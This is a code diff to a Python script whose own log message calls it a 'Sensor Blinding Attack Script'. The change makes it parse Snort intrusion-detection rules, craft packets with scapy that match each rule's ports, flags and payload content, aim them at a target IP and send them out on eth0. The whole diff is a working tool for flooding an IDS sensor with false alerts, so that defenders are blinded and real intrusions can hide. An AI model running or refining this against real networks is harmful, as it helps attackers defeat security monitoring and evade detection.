@@ -1,7 +1,5 @@
 import json
-import re
-import socket
-import struct
+from scapy.all import *
 import fcntl
 import os
 
@@ -94,45 +92,25 @@ def auto_interface():
         return error
 
 
-def initial_dialog() -> tuple | int:
-    clog("Welcome to Sensor Blinding Attack Script (GAFFK)", LOG_INFO)
-    clog("Loading config...", LOG_INFO)
-    config, data, rules_filename = parse_config()
-    if isinstance(config, Exception):
-        clog("An error has occurred while loading config", LOG_ERROR)
-        clog(f"Error: {config}", LOG_ERROR)
-        return -1
-    clog("Config successfully loaded!", LOG_INFO)
-
-    clog("Performing initial config checkup...", LOG_INFO)
-    check_result = check_config(config)
-    if check_result == -1:
-        clog("Target IP not valid / not specified. Please check config file", LOG_ERROR)
-        return -1
-    if check_result == -2:
-        clog("Source interface used for attack is not specified / not valid", LOG_WARN)
-        clog("Interface will be chosen automatically", LOG_WARN)
-        auto_interface()
-    return config, data, rules_filename
-
-
 def main():
     configure_logging(LOGFILE, LOG_LEVEL)
-    dialog_result = initial_dialog()
-    if dialog_result == -1:
-        exit(1)
-    config_data, snort_vars, snort_rules_filename = dialog_result
+    config_data, snort_vars, snort_rules_filename = parse_config()
     for parsed in snort_regex.snort_rules_parser(filename=snort_rules_filename):
         print(parsed)
         if parsed['dst_ip'] == 'any':
             parsed['dst_ip'] = config_data['target_ip']
         crafter = packet_crafter.PacketCrafter()
+        content = parsed['raw']['content']
         crafter.craft(
             proto=parsed['protocol'],
             destination_addr=':'.join(map(str, (parsed['dst_ip'], parsed['dst_port']))),
             flags=parsed['raw']['flags'],
+            src_port=parsed['src_port'],
+            content=bytes.fromhex(content.replace('\\x', '')) if content else None
         )
         print(crafter.packet)
+        print(hexdump(crafter.packet))
+        sendp(crafter.packet, iface='eth0')
 
 
 if __name__ == "__main__":
